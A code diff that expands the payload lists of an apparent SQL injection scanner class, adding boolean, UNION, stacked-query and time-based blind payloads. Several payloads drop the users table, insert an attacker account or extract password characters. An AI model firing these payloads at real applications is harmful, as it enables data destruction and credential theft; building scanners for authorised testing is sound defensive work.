@@ -11,6 +11,7 @@ class SQLInjectionScanner(BaseScanner):
     def __init__(self, target_url: str, config: Dict):
         super().__init__(target_url, config)
         self.payloads = [
+            # Classic Injection Payloads
             "' OR '1'='1",
             "' UNION SELECT '1",
             "1' OR '1'='1",
@@ -20,20 +21,46 @@ class SQLInjectionScanner(BaseScanner):
             "') OR ('1'='1",
             "' OR '1'='1'--",
             "' OR 1=1#",
-            "' OR EXISTS(SELECT 1)--"
+            "' OR EXISTS(SELECT 1)--",
+            
+            # Advanced Injection Payloads
+            "' UNION ALL SELECT 1, 2, 3--",
+            "' OR 1 IN (SELECT 1)--",
+            "' OR (SELECT 'x') = 'x'--",
+            "' AND (SELECT 'x') = 'x'--",
+            "' UNION SELECT username, password FROM users--",
+            
+            # Numeric Injections
+            "1 OR 1=1",
+            "1 AND 1=0",
+            
+            # Stacked Queries
+            "'; DROP TABLE users--",
+            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password')--",
+            
+            # Blind SQL Injection Techniques
+            "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--",
+            "' AND (LENGTH(password) > 10)--"
         ]
         
         self.boolean_payloads = [
+            # Expanded Boolean-based Injection Payloads
             ("' AND '1'='1", "' AND '1'='2"), 
             ("' OR '1'='1", "' OR '1'='2"),   
-            ("1' OR '1'='1", "1' OR '1'='2")  
+            ("1' OR '1'='1", "1' OR '1'='2"),
+            ("1 AND 1=1", "1 AND 1=0"),
+            ("' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100--", 
+             "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) < 100--")
         ]
         
         self.time_payloads = [
+            # Time-based Blind SQL Injection Payloads
             "'; SELECT SLEEP(5)--",
             "'; WAITFOR DELAY '0:0:5'--",
             "' OR SLEEP(5)--",
-            "' AND SLEEP(5)--"
+            "' AND SLEEP(5)--",
+            "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a', SLEEP(5), 0)--",
+            "1' AND (SELECT IF(SUBSTRING(password,1,1)='a', BENCHMARK(5000000,MD5('a')), 0) FROM users LIMIT 1)--"
         ]
 
     def scan(self) -> Dict:
